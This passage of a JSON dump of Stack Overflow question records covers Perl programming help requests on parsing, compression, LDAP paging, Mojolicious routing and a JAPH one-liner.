guessing there is a simple and efficient function to do this, maybe using <code>each</code> or something, but I can't find any examples to follow. Any ideas?</p>\n"},{"tags":["perl","post","get","query-string","html-form"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12390129,"title":"Given a query string and the empty form html it came from generate filled in html","body":"<p>I have an html with empty forms and I have the query string that was generated when filling in those forms. </p>\n\n<p>How can I merge them together into a filled in html page?</p>\n\n<p>Hopefully you can give me a perl based solution.</p>\n\n<p><strong>Edit:</strong> I have a web scrapper based on WWW::Mechanize with perl. I am saving the html content to generate a hmtl slideshow of the session, however I can't save the html with the filled-in values.</p>\n\n<p>I have looked at mechanize source and the it is creating a HTML::Form object to handle the forms. I have looked at HTML::Form and I don't see how I can turn the object back to html, there is just a dump method.</p>\n\n<p>There is a section in HTML::Form code that lets me generate the POST or GET request and I thought that maybe that was a good starting point to generate filled-in hmtl by merging the request with the original html.</p>\n\n<pre><code>if ($method eq \"GET\") {\n    require HTTP::Request;\n    $uri = URI-&gt;new($uri, \"http\");\n    $uri-&gt;query_form(@form);\n    return HTTP::Request-&gt;new(GET =&gt; $uri);\n}\nelsif ($method eq \"POST\") {\n    require HTTP::Request::Common;\n    return HTTP::Request::Common::POST($uri, \\@form,\n        Content_Type =&gt; $enctype);\n}\n</code></pre>\n\n<p>So I can use that code snipet in my mechanize program after I am done filling forms to get the final POST or GET request but that is as far as I go :(</p>\n"},{"tags":["perl","thrift","hive"],"answer_count":3,"favorite_count":2,"up_vote_count":5,"down_vote_count":0,"view_count":1518,"score":5,"question_id":5289164,"title":"Perl Thrift client to Hive?","body":"<p>I'd like to connect to a Hadoop-based Hive datastore using Perl.\nHive allows connection using the Thrift interface (http://wiki.apache.org/hadoop/Hive/HiveClient), and there is a Thrift implementation for Perl (e.g. <a href=\"http://search.cpan.org/~agrundma/Thrift-XS-1.01/lib/Thrift/XS.pm\">http://search.cpan.org/~agrundma/Thrift-XS-1.01/lib/Thrift/XS.pm</a>). However, the only Thrift client I found is a Cassandra client.</p>\n\n<p>Any ideas if such a client exists, or how to create it? \nMaybe it's even possible to connect without explicitly defining one?</p>\n\n<p>(PS - there is also an ODBC/JDBC interface to Hive, but installing these modules is a headache, and would be a last resort)</p>\n\n<p>thanks!</p>\n"},{"tags":["perl","split"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":74,"score":-1,"question_id":12399893,"title":"Perl: HOwto split","body":"<p>My code is as follows:</p>\n\n<pre><code>VAR DS 0D\n    DC    AL1(045),AL2(286),AL2(117),AL2(290)\n</code></pre>\n\n<p>I need to split this and push to my output file in the below 2 formats...</p>\n\n<pre><code>format1:\nVAR DS  0D\n    DC  AL1(045)\n    DC  AL2(286)\n    DC  AL2(117)\n    DC  AL2(290)\n\nformat2:\nVAR D \nF1  A 045\nF2  A 286\nF3  A 117\nF4  A 290\n</code></pre>\n\n<p>How can I perform this action using Perl.</p>\n"},{"tags":["perl","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":59,"score":-1,"question_id":12407776,"title":"Place Variable Into Array","body":"<p>How can I place a variable into an array here is what i have tried with no luck.</p>\n\n<pre><code>    #!/usr/bin/perl\n\n    use CGI qw(:standard);\n    use CGI::Carp qw(warningsToBrowser fatalsToBrowser);\n    use strict;\n\n    my $State = \"Alabama 205 251 256 334 659 938\";\n\n    my @Array = qw($State);\n\n    print \"@Array\";\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12393629,"title":"change file extension (ods to csv) and get an output for each file","body":"<p>I have many files in ods format and I want to convert them to csv format by a perl code. Also, I have a perl code which replace some characters by others, but for each file I have to tape its name, so I want to be able to proceed a bunch of files at the same time, and to have an output for each file with the modifications. \nSo far my code looks like this :</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse Data::Dumper;\n\n\nmy @repertoire =glob('/home/test/Desktop');\n\n\n# warn Dumper \\@repertoire;\nforeach my $fileName (@repertoire)\n{\n    open(IN, \"&lt;$fileName\") or die \"Can't read file '$fileName' [$!]\\n\";\n    print \"$fileName\\n\" ;\n    @files=&lt;IN&gt;;\n    close(IN);\n\n    foreach $file (@files)\n    {\n     $file =~ /(\\x{0625}\\x{0646}\\b.+?)\\./[[    ]]/g)\n     my $new=$file;\n   print $new;\n   print \"\\n\";\n   system(\"cp @repertoire/$file @repertoire/$new\") # copy output of each file in  '/home/test/Desktop'\n    }\n}\n</code></pre>\n"},{"tags":["linux","perl","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12399831,"title":"Text parsing using shell script","body":"<p>I have few text files that has some key words. I have to select few lines from those files and parse it. Below is a sample file. I have to grep for \"Customer\" and get the line from the file.</p>\n\n<pre><code>13 Sun Sep  9 12:14:38 2012 : [P] Reproducer has the 167 number \n13 Sun Sep  9 12:14:38 2012 : [P] Customer has the 12.14.19.9 \n13 Sun Sep  9 12:14:38 2012 : [P] Customer has the 12.14.89.9 \n13 Sun Sep  9 12:14:38 2012 : [P] Reproducer has the 170 number \n13 Sun Sep  9 12:14:38 2012 : [P] Customer has the 12.4.89.16 \n</code></pre>\n\n<p>I have to select only the lines that has Customer and have to parse it to get only the Timestamp (12:14:38) and the Number 12.14.19.9. I have to do this for multiple files. All the file has the same structure of the log. I have done this using the oneliner like below</p>\n\n<pre><code>grep Customer Neigh.log | cut -d \" \" -f 5- | cut -d \":\" -f 1-4 | cut -d \" \" -f 1,8\n</code></pre>\n\n<p>But I need to do this inside a shell script. How can I do this. Can anyone help?</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","perl","bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":108,"score":0,"question_id":12406152,"title":"Can we set a variable used in perl script as environment variable","body":"<p>I have a Perl script which has variable like <code>my $name</code>. Can we set name as environment variable which we can import and use in other files\nI tried like <code>$ENV{NAME}=name</code> but this is not working</p>\n"},{"tags":["perl","iteration","template-toolkit","dancer"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":98,"score":-1,"question_id":12406080,"title":"template toolkit - Iterating through array of hashes","body":"<p>I couldn't find the answer to this one on the web.</p>\n\n<p>Using Dancer and Template toolkit, I have an array of hashes which I would like to print to a table on my webapp. \nThis is how I send the data structure to the template:</p>\n\n<pre><code>template \"find_ip_results2\", {\n    user =&gt; \\@user,\n};\n</code></pre>\n\n<p>What is the correct foreach syntax to iterate this structure and access each key-value pair?</p>\n"},{"tags":["regex","arrays","perl","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":83,"score":3,"question_id":12386039,"title":"Perl: Comparing two files and printing data that match and don't match","body":"<p>For the Perl code below, I need to increase its efficiency since it's taking hours to process the input files (which contain millions of lines of data). Any ideas on how I can speed things up?</p>\n\n<p>Given two files, I want to compare the data and print those lines that match and those that don't. Please note that two columns need to be compared interchangeably.</p>\n\n<p>For example,</p>\n\n<pre><code>input1.txt\nA B\nC D\n\ninput2.txt\nB A\nC D\nE F\nG H\n</code></pre>\n\n<p>Please note: \nLines 1 and 2 match (interchangeably); Lines 3 and 4 don't match</p>\n\n<pre><code>Output:\nB A match\nC D match\nE F don't match\nG H don't match\n</code></pre>\n\n<p>Perl code:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\n\nopen INFH1, \"&lt;input1.txt\" || die \"Error\\n\";\nopen INFH2, \"&lt;input2.txt\" || die \"Error\\n\";\nchomp (my @array=&lt;INFH2&gt;);\n\nwhile (&lt;INFH1&gt;) \n{\n\n  my @values = split;\n  next if grep /\\D/, @values or @values != 2;\n\n  my $re = qr/\\A$values[0]\\s+$values[1]\\z|\\A$values[1]\\s+$values[0]\\z/;\n\n    foreach my $temp (@array)\n    {\n    chomp $_;\n    print \"$_\\n\" if grep $_ =~ $re, $temp;                      \n    }\n}\nclose INFH1;\nclose INFH2;\n1;\n</code></pre>\n\n<p>Any ideas on how to increase the efficiency of this code is highly appreciated. Thanks!</p>\n"},{"tags":["php","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12403755,"title":"Create compressed string in perl that can be uncompressed by php gzuncompress","body":"<p>I need to create a compressed string using Perl that I can uncompress using PHP gzuncompress</p>\n\n<p>I tried the following in Perl</p>\n\n<pre><code>use IO::Compress::Gzip qw(gzip $GzipError) ;\nmy $input  = 'THIS IS A TEST'; \nmy $output;\ngzip \\$input =&gt; \\$output;\n</code></pre>\n\n<p>but PHP cannot uncompress this</p>\n\n<p>If I view the out from perl it is different than if I compressed it using PHP's gzcompress</p>\n\n<p>Any help in solving this would be much appreciated</p>\n"},{"tags":["perl","twitter-api","perl-module","twitter-oauth","dancer"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1170,"score":0,"question_id":5254369,"title":"Can't locate MIME/Types.pm in @INC ... at /usr/local/share/perl/5.10.1/Dancer/MIME.pm line 7","body":"<p>I'm very new to programming so I apologise if I've missed something obvious.</p>\n\n<p>I'm following the directions at <a href=\"https://github.com/keeth/Net-OAuth/blob/master/README\" rel=\"nofollow\">https://github.com/keeth/Net-OAuth/blob/master/README</a> and got the following error:</p>\n\n<pre><code>Can't locate MIME/Types.pm in @INC\n(@INC contains: /etc/perl /usr/local/lib/perl/5.10.1 /usr/local/share/perl/5.10.1 \n/usr/lib/perl5 /usr/share/perl5 /usr/lib/perl/5.10 /usr/share/perl/5.10\n/usr/local/lib/site_perl .) at /usr/local/share/perl/5.10.1/Dancer/MIME.pm line 7.\n</code></pre>\n\n<p>It sounds like there's an error in the perl module <code>Dancer/MIME.pm</code>? If so I don't know how I could ever debug that.</p>\n\n<p><em>Addendum: more error messages.</em></p>\n\n<pre><code>$ ./mayor-emanuel.pl Can't locate HTTP/Body.pm in @INC (@INC contains: /etc/perl \n/usr/local/lib/perl/5.10.1 /usr/local/share/perl/5.10.1 /usr/lib/perl5 /usr/share/perl5 \n/usr/lib/perl/5.10 /usr/share/perl/5.10 /usr/local/lib/site_perl .) at \n/usr/local/share/perl/5.10.1/Dancer/Request.pm line 12. BEGIN failed--compilation aborted at \n/usr/local/share/perl/5.10.1/Dancer/Request.pm line 12. Compilation failed in require at \n/usr/local/share/perl/5.10.1/Dancer/Route.pm line 11. BEGIN failed--compilation aborted at \n/usr/local/share/perl/5.10.1/Dancer/Route.pm line 11. Compilation failed in require at\n/usr/local/share/perl/5.10.1/Dancer/Route/Registry.pm line 5. BEGIN failed--compilation \naborted at /usr/local/share/perl/5.10.1/Dancer/Route/Registry.pm line 5. Compilation failed \nin require at /usr/local/.../Dancer/App.pm line 10. BEGIN failed--compilation aborted at \n/usr/local/share/perl/5.10.1/Dancer/App.pm line 10. Compilation failed in require at \n/usr/local/share/.../Dancer.pm line 13. BEGIN failed--compilation aborted at \n/usr/local/share/perl/5.10.1/Dancer.pm line 13. Compilation failed in require at ./mayor-\nemanuel.pl line 5. BEGIN failed--compilation aborted at ./mayor-emanuel.pl line\n</code></pre>\n\n<p>By the way I use Ubuntu 10.04.</p>\n\n<p><strong>Question:</strong> what does this mean and what should I do about it?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":48,"score":-2,"question_id":12402531,"title":"Modification of a file using Perl","body":"<p>I have a xml file that looks like</p>\n\n<pre><code>     &lt;?xml version=\"1.0\"?&gt;\n     &lt;product = \"AAA\"&gt;\n     &lt;shell name = \"110\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n     &lt;product = \"AAA\"&gt;\n     &lt;shell name = \"310\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n     &lt;product = \"BBB\"&gt;\n     &lt;shell name = \"10\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n     &lt;product = \"BBB\"&gt;\n      &lt;shell name = \"10010\"&gt;\n         &lt;style = \"0300\" size =\"3\"/&gt;\n         &lt;style = \"2030\" size =\"3\"/&gt;\n         &lt;style = \"8003\" size =\"1\"/&gt;\n         &lt;style = \"09003\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n     &lt;product = \"BBB\"&gt;\n      &lt;shell name = \"110\"&gt;\n         &lt;style = \"0300\" size =\"3\"/&gt;\n         &lt;style = \"2030\" size =\"3\"/&gt;\n         &lt;style = \"8003\" size =\"1\"/&gt;\n         &lt;style = \"09003\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n</code></pre>\n\n<p>I want to write a script that should club the shell of the same product so that I have an output like</p>\n\n<pre><code>     &lt;?xml version=\"1.0\"?&gt;\n     &lt;product = AAA&gt;\n     &lt;shell name = \"110\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n    &lt;shell name = \"310\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n   &lt;/product&gt;\n     &lt;product = BBB&gt;\n    &lt;shell name = \"10\"&gt;\n         &lt;style = \"000\" size =\"3\"/&gt;\n         &lt;style = \"200\" size =\"3\"/&gt;\n         &lt;style = \"800\" size =\"1\"/&gt;\n         &lt;style = \"0900\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;shell name = \"10010\"&gt;\n         &lt;style = \"0300\" size =\"3\"/&gt;\n         &lt;style = \"2030\" size =\"3\"/&gt;\n         &lt;style = \"8003\" size =\"1\"/&gt;\n         &lt;style = \"09003\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;shell name = \"110\"&gt;\n         &lt;style = \"0300\" size =\"3\"/&gt;\n         &lt;style = \"2030\" size =\"3\"/&gt;\n         &lt;style = \"8003\" size =\"1\"/&gt;\n         &lt;style = \"09003\" size =\"3\"/&gt;\n     &lt;/shell name&gt;\n     &lt;/product&gt;\n</code></pre>\n\n<p>Any ideas of how I can proceed??? I was thinking of searching a string \n     \nbut how can I reach to the second occurance. I know how to read the file and count the number of occurance of a particular string but can any one help how can I reach the second occurance of a  particular string?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":2,"up_vote_count":17,"down_vote_count":0,"view_count":392,"score":17,"question_id":10858682,"title":"How does this perl one-liner actually work?","body":"<p>So, I happened to notice that last.fm is hiring in my area, and since I've known a few people <a href=\"http://dekstop.de/weblog/\">who worked</a> <a href=\"http://russ.garrett.co.uk/\">there</a>, I though of applying. </p>\n\n<p>But I thought I'd better take a look at the <a href=\"http://www.last.fm/about/team\">current staff</a> first.</p>\n\n<p>Everyone on that page has a cute/clever/dumb strapline, like \"Is life not a thousand times too short for us to bore ourselves?\". In fact, it was quite amusing, until I got to this:</p>\n\n<pre><code>perl -e'print+pack+q,c*,,map$.+=$_,74,43,-2,1,-84, 65,13,1,5,-12,-3, 13,-82,44,21, 18,1,-70,56, 7,-77,72,-7,2, 8,-6,13,-70,-34'\n</code></pre>\n\n<p>Which I couldn't resist pasting into my terminal (kind of a stupid thing to do, maybe), but it printed:</p>\n\n<blockquote>\n  <p>Just another Last.fm hacker,</p>\n</blockquote>\n\n<p>I thought it would be relatively easy to figure out how that perl one-liner works. But I couldn't really make sense of the documentation, and I don't know perl, so I wasn't even sure I was reading the relevant documentation.</p>\n\n<p>So I tried modifying the numbers, which got me nowhere. So I decided it was geniunely interesting and worth figuring out.</p>\n\n<p>So, 'how does it work' being a bit vague, my question is mainly, </p>\n\n<p>What are those numbers? Why are there negative numbers and positive numbers, and does the negativity or positivity matter?</p>\n\n<p>What does the combination of operators <code>+=$_</code> do?</p>\n\n<p>What's <code>pack+q,c*,,</code> doing?</p>\n"},{"tags":["iphone","objective-c","xcode","perl","zlib"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12399822,"title":"iPhone ZLib uncompress String Objective-C","body":"<p>I come from a perl background. I would like to use zlib to uncompress some data. The data is stored as an iPhone String. In PERL, I would usually do the following:</p>\n\n<pre><code>Compress::Zlib::uncompress(substr $data, 8);\n</code></pre>\n\n<p>However, the uncompress function of zlib in objective-c seems to require the following</p>\n\n<pre><code>uncompress(Bytef *dest, uLongf *destLen, Bytef *source, uLongf *sourceLen);\n</code></pre>\n\n<p>The data is being uncompressed and added to a substring, which is then hashed. (HMAC-SHA256-HEX)</p>\n\n<p>How would I go about creating this data. For reference, the data is created in Perl as the following.</p>\n\n<pre><code>$data = \"F\" . substr($data, 1, 7)\n          . Compress::Zlib::uncompress(substr $data, 8);\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["arrays","perl","push"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":100,"score":-2,"question_id":12396459,"title":"Push function in perl","body":"<p>In the below code, When I push each line into an array (@num), I found that a single space is being added to the end of the line while passing in to array.</p>\n\n<p>There is no space at the end of line in my input file. I found this single space when I print all elements in the array.</p>\n\n<pre><code>open (A, \"file.txt\");\nmy @num = ();\n\nwhile(my $each=&lt;A&gt;)\n{\n    chomp $each;\n    $each=~s/\\s//g;\n    push(@num,$each);\n}\nclose(A);\n</code></pre>\n\n<p>Can some one help me on this?</p>\n"}]}
{"total":22324,"page":19,"pagesize":100,"questions":[{"tags":["perl","nlp","counting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12399298,"title":"how to use perl to count the number of specific words in a string where numbers also occur","body":"<p>This is a bit of a two part thing using perl. One is only counting the words that match an array of predetermined words. The second more complex part that I actually need help with is I can't understand how to handle counting those words when numbers also appear (in string form). For example, I have a string that may read:</p>\n\n<p>A large tree, two dogs, Brittany and Colin are here.</p>\n\n<p>What I am looking for is the total number of objects from my array (tree, dog, brittany, colin) in the sentence. 1 tree, 2 dogs, 1 brittany and 1 colin = 5. I get treating \"two\" as 2 and \"three\" as 3 but how do I count the \"tree\", \"two/2\" but not double count \"dogs\" so to speak...since the two is replacing the need to count \"dogs\" as 1? \"dogs\" won't always be two either so I cant just treat the plural as 2, it could be 3 or 4 or 50. This would be manageable if it were just \"tree, dog, Brittany, Colin\" but the addition of two, three, four, etc is melting my brain.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":3,"view_count":77,"score":0,"question_id":12342856,"title":"Perl - curlie braces for a hash","body":"<p>Which structure is created as following in Perl?</p>\n\n<pre><code>my $self = { Name =&gt; $name, Color =&gt; $class-&gt;default_color };\n</code></pre>\n\n<p>If it is a hash, then is the official notation not the following ( parentheses, <code>%</code> instead of <code>$</code>):</p>\n\n<pre><code>my %self = ( Name =&gt; $name, Color =&gt; $class-&gt;default_color );\n</code></pre>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":31,"score":-1,"question_id":12398784,"title":"Writing MS Word 2007 with styles using Perl","body":"<p>How can I write a .doc file using Perl with styles like background color, font color/name/size etc.</p>\n"},{"tags":["perl","bash","unix","sed","awk"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":12390369,"title":"Pattern Matching in Columns","body":"<p><strong>File 1</strong></p>\n\n<pre><code>A11;F1;BMW\nA23;F2;BMW\nB12;F3;BMW\nH11;F4;JBW\n</code></pre>\n\n<p><strong>File 2</strong></p>\n\n<pre><code>P01;A1;0;0--00  ;123;456;150\nP01;A11;0;0--00  ;123;444;208\nP01;B12;0;0--00  ;123;111;36\nP01;V11;0;0--00  ;123;787;33.9\n</code></pre>\n\n<p><strong>Output</strong> </p>\n\n<pre><code>-;-;-;P01;A1;0;0--00  ;123;456;150\nA11;F1;BMW;P01;A11;0;0--00  ;123;444;208\nB12;F3;BMW;P01;B12;0;0--00  ;123;111;36\n-;-;-;P01;V11;0;0--00  ;123;787;33.9\n</code></pre>\n\n<p><strong>I TRIED</strong> </p>\n\n<pre><code>awk 'FNR==NR {a[$2] = $0; next }{ if($1 in a) {p=$1;$1=\"\";print a[p],$0}}' File1 File2 \n</code></pre>\n\n<p>But didnt work.</p>\n\n<p>Basically I want to get the details from FILE 1 and compare with FILE2 (master list) .</p>\n\n<p><strong>Example :</strong> </p>\n\n<p>A1 in FILE2 was not available in FILE1 , so in output file we have â-â for 1st three fields and rest from FILE2 . Now, we have A11 and we got the detail in FILE1. So we write details of A11 from both File 1 &amp; 2</p>\n"},{"tags":["perl","active-directory","ldap"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":170,"score":0,"question_id":12309539,"title":"SizeLimit exceeded using Net::LDAP::Control::Paged","body":"<p>According to all the documentation I've read, the maximum size of a result set when querying Active Directory is 1000 records.  If you need more than 1000, you are told to use Net::LDAP::Control::Paged in order to page through and get more than 1000 records, which I have attempted to do.  For some reason, I am still only getting 1000 records back, despite using a paged control.  I am using the same code that others have claimed to be using successfully without any luck.  Am I missing something here?  Please note that I do not have administrative access to the AD servers, so changing the configuration is not an option for me.  I've pasted the relevant code below so you can point out whatever I might have done wrong.</p>\n\n<pre><code>#!perl -w\n\nuse strict;\nuse Net::LDAP;\nuse Net::LDAP::Control::Paged;\nuse Net::LDAP::Constant qw( LDAP_CONTROL_PAGED );\n\nmy $LDAPServer      = \"&lt;LDAP SERVER ADDRESS&gt;\";\nmy $base        = \"&lt;BASE DN&gt;\";\nmy $user                = \"&lt;LDAP USER&gt;\";\nmy $pass                = \"&lt;PASSWORD&gt;\";\nmy $page                = Net::LDAP::Control::Paged-&gt;new(size =&gt; 1000) or die $!;\nmy $errorConnectionStr  = \"\";\nmy $ldap;\nmy $mesg;\nmy $cookie;\n\n$ldap = Net::LDAP-&gt;new($LDAPServer);\n$mesg = $ldap-&gt;bind($user, password =&gt; $pass, version =&gt; 3);\n\nopen(OUT,\"&gt;users.csv\");\nprint OUT \"sAMAccountName,sn,givenName\\n\";\n\nmy $filter = \"(&amp;(objectClass=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(objectClass=computer)))\";\nmy @attribs = (\"sn\", \"givenName\", \"sAMAccountName\", \"distinguishedName\");\n\nmy @args = (\n        base    =&gt; $base,\n        scope   =&gt; 'sub',\n        filter  =&gt; $filter,\n        attrs   =&gt; @attribs,\n        pagesize =&gt; 1000,\n        control =&gt; [$page]\n);\n\nwhile(1) {\n    $mesg = $ldap-&gt;search(@args) or die $!;\n\n    while (my $entry = $mesg-&gt;pop_entry()) {\n        my $print = 1;\n\n        my $dn = $entry-&gt;dn();\n        my $uid = $entry-&gt;get_value('sAMAccountName');\n        my $ln = $entry-&gt;get_value('sn');\n        my $fn = $entry-&gt;get_value('givenName');\n\n        if($dn =~ m/.*Resources.*/) {\n            $print = 0;\n        }\n\n        if(defined($uid) &amp;&amp; defined($ln) &amp;&amp; defined($fn)) {\n            if($print == 1) {\n                print OUT \"$uid,$ln,$fn\\n\";\n            }\n        }\n    }\n\n    my ($resp) = $mesg-&gt;control(LDAP_CONTROL_PAGED) or last;\n    $cookie = $resp-&gt;cookie or last;\n    $page-&gt;cookie($cookie);\n}\n\nif($cookie) {\n    print \"Abnormal exit\\n\";\n    $page-&gt;cookie($cookie);\n    $page-&gt;size(0);\n    $ldap-&gt;search(@args);\n}\n\nclose(OUT);\n$ldap-&gt;unbind;\n</code></pre>\n"},{"tags":["php","arrays","perl","variables","loops"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":10,"view_count":143,"score":-6,"question_id":12397251,"title":"Whats the php equivalent of $_ in perl?","body":"<p>In Perl, you can reference the current variable of a loop via <code>$_</code></p>\n\n<p>For example:</p>\n\n<pre><code>my @array = (1,2,3,4);\nforeach(@array)\n{\n    print $_.\" \";\n}\n</code></pre>\n\n<p>Will print:</p>\n\n<pre><code>1 2 3 4 \n</code></pre>\n\n<p>Is there a php equivalent for this?</p>\n"},{"tags":["regex","perl","split"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":91,"score":0,"question_id":12394033,"title":"How does this Perl code split a string into three-character chunks?","body":"<p>I have a string that I need to split into three-character chunks.  Googling found the following code, which works fine:</p>\n\n<pre><code>$input = \"DEADBEEF\";\n@output = ();\nmy @output = ( $input =~ m/.{3}/g );\nprint $_.\"\\n\" foreach (@output);\n</code></pre>\n\n<p>I am a Perl beginner; can someone explain to me what the expression <code>$input =~ m/.{3}/g</code> does?</p>\n"},{"tags":["perl","mojolicious"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":91,"score":3,"question_id":12396934,"title":"Why separate routing and controller actions in mojolicious?","body":"<p>I am reading the section of <a href=\"https://metacpan.org/module/Mojolicious%3a%3aGuides%3a%3aGrowing#Simplified-application-class\" rel=\"nofollow\">Mojolicious::Guides::Growing</a> where it tells you how to grow a Mojolicious::Lite into a \"well organized\" cpan-uploadable application.  First, it tells you to split the M::L app into a launch script and an application class.</p>\n\n<pre><code>package MyApp;\nuse Mojo::Base 'Mojolicious';\n\nuse MyUsers;\n\nsub startup {\n  my $self = shift;\n\n  # ...auth stuff omitted...\n\n  my $r = $self-&gt;routes;\n  $r-&gt;any('/' =&gt; sub {\n    my $self = shift;\n\n    my $user = $self-&gt;param('user') || '';\n    my $pass = $self-&gt;param('pass') || '';\n    return $self-&gt;render unless $self-&gt;users-&gt;check($user, $pass);\n\n    $self-&gt;session(user =&gt; $user);\n    $self-&gt;flash(message =&gt; 'Thanks for logging in.');\n    $self-&gt;redirect_to('protected');\n  } =&gt; 'index');\n\n  $r-&gt;get('/protected' =&gt; sub {\n    my $self = shift;\n    return $self-&gt;redirect_to('index') unless $self-&gt;session('user');\n  });\n\n  $r-&gt;get('/logout' =&gt; sub {\n    my $self = shift;\n    $self-&gt;session(expires =&gt; 1);\n    $self-&gt;redirect_to('index');\n  });\n}\n\n1;\n</code></pre>\n\n<p>This makes sense to me.  But then it goes on to say that this application class can further be refactored into a controller class with the actions, and the application class itself can be reduced to the routing information:</p>\n\n<pre><code>package MyApp::Login;\nuse Mojo::Base 'Mojolicious::Controller';\n\nsub index {\n  my $self = shift;\n\n  my $user = $self-&gt;param('user') || '';\n  my $pass = $self-&gt;param('pass') || '';\n  return $self-&gt;render unless $self-&gt;users-&gt;check($user, $pass);\n\n  $self-&gt;session(user =&gt; $user);\n  $self-&gt;flash(message =&gt; 'Thanks for logging in.');\n  $self-&gt;redirect_to('protected');\n}\n\nsub protected {\n  my $self = shift;\n  return $self-&gt;redirect_to('index') unless $self-&gt;session('user');\n}\n\nsub logout {\n  my $self = shift;\n  $self-&gt;session(expires =&gt; 1);\n  $self-&gt;redirect_to('index');\n}\n\n1;\n\npackage MyApp;\nuse Mojo::Base 'Mojolicious';\n\nuse MyUsers;\n\nsub startup {\n  my $self = shift;\n\n  # ...auth stuff omitted...\n\n  my $r = $self-&gt;routes;\n  $r-&gt;any('/')-&gt;to('login#index')-&gt;name('index');\n  $r-&gt;get('/protected')-&gt;to('login#protected')-&gt;name('protected');\n  $r-&gt;get('/logout')-&gt;to('login#logout')-&gt;name('logout');\n}\n\n1;\n</code></pre>\n\n<p>I don't see why this is superior to the \"hybrid\" version where routes and actions are intermingled, because now in order to redirect between the actions with redirect_to() in the controller, you need to look at the routing infomration in a different file, and if you want to change a url, you have to do it in two different files instead of one.  This:</p>\n\n<pre><code>  $r-&gt;get('/protected' =&gt; sub {\n    my $self = shift;\n    return $self-&gt;redirect_to('index') unless $self-&gt;session('user');\n  });\n</code></pre>\n\n<p>turns into:</p>\n\n<pre><code>sub protected {\n  my $self = shift;\n  return $self-&gt;redirect_to('index') unless $self-&gt;session('user');\n}\n\n$r-&gt;get('/protected')-&gt;to('login#protected')-&gt;name('protected');\n</code></pre>\n\n<p>Which has the word \"protected\" 4 times in two different files (although I'm not sure what the name(\"protected\") does yet).</p>\n\n<p>I'm a complete novice when it comes to web development, by the way. </p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":12376507,"title":"simultanious perl system calls on windows","body":"<p>Trying to find a way to have a perl script run 4 other perl scripts on windows and then once all are done, kick off a 5th script. I have checked out a bunch of things but none seem straight forward. Suggestions welcome.  The scripts are going to run on a windows box. scripts 1-4 need to finish first before starting script 5</p>\n"},{"tags":["perl","multidimensional-array","slice"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12393641,"title":"Collecting subarrays from multidimensional arrays in Perl","body":"<p>Say I build the following multidimensional array:</p>\n\n<pre><code>my @array;  # 